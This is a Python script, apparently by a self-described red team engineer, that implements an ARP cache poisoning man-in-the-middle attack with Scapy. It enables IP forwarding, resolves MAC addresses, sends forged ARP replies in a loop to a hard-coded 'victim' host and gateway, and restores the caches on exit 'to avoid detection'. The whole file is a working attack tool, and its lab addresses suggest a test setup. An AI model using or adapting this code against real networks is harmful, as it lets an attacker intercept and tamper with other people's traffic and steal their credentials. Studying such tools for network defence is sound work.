#!/usr/bin/env python3
"""
Advanced L2 MitM Framework (ARP Cache Poisoning).
Patched for Docker environments and strict L2 encapsulation.

Author: 18ilya99
Role: Security Researcher / Red Team Engineer
"""

from scapy.all import ARP, Ether, sendp, srp
import os
import sys
import time
import subprocess

def enable_ip_forwarding():
    """Enables IP forwarding, gracefully handling Docker read-only /proc."""
    print("[*] Attempting to enable IP forwarding...")
    try:
        # Пытаемся записать 1. Скрываем вывод ошибок в /dev/null
        subprocess.run("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True, check=True, stderr=subprocess.DEVNULL)
        print("[+] IP forwarding enabled.")
    except subprocess.CalledProcessError:
        print("[-] Notice: /proc/sys is read-only (likely running in Docker).")
        print("[-] Skipping IP forwarding setup. Ensure it's enabled on the host/container level.")

def get_mac(ip):
    """Resolves the MAC address for a given IP via ARP Request."""
    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
    answered, _ = srp(arp_request, timeout=2, verbose=False)
    if answered:
        return answered[0][1].hwsrc
    return None

def poison_target(gateway_ip, gateway_mac, target_ip, target_mac):
    """Sends malicious ARP replies with strict L2 Ethernet encapsulation."""
    # Собираем пакет: явно указываем L2 Ether(dst) + L3 ARP(hwdst)
    poison_target_pkt = Ether(dst=target_mac) / ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac)
    poison_gateway_pkt = Ether(dst=gateway_mac) / ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac)
    
    # sendp() отправляет пакет на уровне L2
    sendp(poison_target_pkt, verbose=False)
    sendp(poison_gateway_pkt, verbose=False)

def restore_network(gateway_ip, gateway_mac, target_ip, target_mac):
    """Sends legitimate Gratuitous ARP packets to restore the original cache."""
    print("\n[*] Restoring network ARP caches to avoid detection...")
    
    restore_target_pkt = Ether(dst=target_mac) / ARP(op=2, psrc=gateway_ip, hwsrc=gateway_mac, pdst=target_ip, hwdst=target_mac)
    restore_gateway_pkt = Ether(dst=gateway_mac) / ARP(op=2, psrc=target_ip, hwsrc=target_mac, pdst=gateway_ip, hwdst=gateway_mac)
    
    sendp(restore_target_pkt, count=5, verbose=False)
    sendp(restore_gateway_pkt, count=5, verbose=False)

def main():
    target_ip = "192.168.137.10" # Ubuntu Victim
    gateway_ip = "192.168.137.1"  # Docker Bridge Gateway
    
    enable_ip_forwarding()
    
    print("[*] Resolving MAC addresses...")
    target_mac = get_mac(target_ip)
    gateway_mac = get_mac(gateway_ip)
    
    if not target_mac or not gateway_mac:
        print("[-] Failed to resolve MAC addresses. Exiting.")
        sys.exit(1)
        
    print(f"[+] Target {target_ip} is at {target_mac}")
    print(f"[+] Gateway {gateway_ip} is at {gateway_mac}")
    
    try:
        print("[*] Starting ARP Poisoning (L2 Encapsulation). Press Ctrl+C to stop.")
        while True:
            poison_target(gateway_ip, gateway_mac, target_ip, target_mac)
            time.sleep(2)
    except KeyboardInterrupt:
        restore_network(gateway_ip, gateway_mac, target_ip, target_mac)
        print("[+] Network restored. Exiting.")

if __name__ == "__main__":
    main()
